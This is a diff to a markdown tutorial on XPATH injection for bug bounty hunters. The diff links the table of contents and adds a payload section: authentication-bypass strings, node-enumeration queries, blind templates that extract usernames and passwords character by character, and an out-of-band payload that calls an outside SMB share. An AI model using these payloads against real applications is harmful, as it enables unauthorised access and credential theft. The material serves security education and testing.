@@ -1,12 +1,12 @@
 # XPATH Injection
 
-- Introduction
-- Understanding XPATH Injection
-- The Impact of XPATH Injection
-- Common Attack Scenarios
-- Modifying Database Contents
-- Tutorials for XPATH Injection
-- Payloads for XPATH Injection
+- [Introduction](#introduction)
+- [Understanding XPATH Injection](#understanding-xpath-injection)
+- [The Impact of XPATH Injection](#the-impact-of-xpath-injection)
+- [Common Attack Scenarios](#common-attack-scenarios)
+- [Modifying Database Contents](#modifying-database-contents)
+- [Tutorials for XPATH Injection](#tutorials-for-xpath-injection)
+- [Payloads for XPATH Injection](#payloads-for-xpath-injection)
 
 # Introduction:
 In the realm of web security vulnerabilities, XPATH injection has emerged as a significant threat. As a bug bounty hunter or ethical hacker, understanding the intricacies of XPATH injection can prove invaluable when searching for vulnerabilities in web applications. This article delves into the details of XPATH injection, highlighting its impact, common attack scenarios, and providing examples to enhance comprehension.
@@ -82,3 +82,41 @@ XPATH injection vulnerabilities pose a significant threat to web applications, e
 - [XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection) - A good tutorial/article by OWASP
 
 ### Payloads for XPATH Injection
+
+Exploitation
+```
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
+
+```
+
+Blind Exploitation
+1. Size of a string
+```
+and string-length(account)=SIZE_INT
+```
+2. Extract a character
+```
+substring(//user[userid=5]/username,2,1)=CHAR_HERE
+substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
+```
+
+Out of Band Exploitation
+```
+http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
+
+```
